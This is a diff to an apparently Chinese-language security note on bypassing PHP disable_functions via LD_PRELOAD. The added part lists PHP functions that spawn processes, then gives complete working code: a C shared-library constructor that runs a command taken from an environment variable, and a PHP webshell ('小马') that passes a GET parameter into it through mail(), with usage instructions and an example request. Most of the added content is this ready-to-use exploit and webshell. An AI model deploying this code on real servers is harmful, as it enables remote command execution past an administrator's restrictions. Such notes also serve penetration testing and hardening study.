@@ -224,12 +224,92 @@ error_log("a",1);
 
 
 
+**可以使用的函数**
+
+```
+mail("aa@qq.com","","","","")
+error_log("a",1)
+$img = new Imagick('xx.wmv')
+imap_mail('1@2','2@3','222','','')
+```
 
 
 
 
-## 0x03 参考链接
+
+### 小马
+
+bypass.c
+
+```
+#define _GNU_SOURCE
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+
+extern char** environ;
+
+__attribute__ ((__constructor__)) void preload (void)
+{
+    // get command line options and arg
+    const char* cmdline = getenv("EVIL_CMDLINE");
+
+    // unset environment variable LD_PRELOAD.
+    // unsetenv("LD_PRELOAD") no effect on some 
+    // distribution (e.g., centos), I need crafty trick.
+    int i;
+    for (i = 0; environ[i]; ++i) {
+            if (strstr(environ[i], "LD_PRELOAD")) {
+                    environ[i][0] = '\0';
+            }
+    }
+
+    // executive command
+    system(cmdline);
+}
+```
+
+
+
+bypass.php
+
+```
+<?php
+    echo "<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so </p>";
+    $cmd = $_GET["cmd"];
+    $out_path = $_GET["outpath"];
+    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
+    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
+    putenv("EVIL_CMDLINE=" . $evil_cmdline);
+    $so_path = $_GET["sopath"];
+    putenv("LD_PRELOAD=" . $so_path);
+    mail("", "", "", "");
+    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
+    unlink($out_path);
+?>
+```
+
+1.  cmd 参数，待执行的系统命令（如 pwd）
+2.  outpath 参数，保存命令执行输出结果的文件路径（如 /tmp/xx），便于在页面上显示，另外关于该参数，你应注意 web 是否有读写权限、web 是否可跨目录访问、文件将被覆盖和删除等几点；
+3. sopath 参数，指定劫持系统函数的共享对象的绝对路径（如 /var/www/bypass_disablefunc_x64.so），另外关于该参数，你应注意 web 是否可跨目录访问到它。
+4. 此外，bypass_disablefunc.php 拼接命令和输出路径成为完整的命令行，所以你不用在 cmd 参数中重定向了
+
+
+
+
+
+```
+bypass.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/bypass_disablefunc_x64.so
+```
+
+
+
+## 0x04 参考链接
 
 https://www.anquanke.com/post/id/175403
 
 https://www.smi1e.top/php-bypass-disabled_functions/
+
+https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD
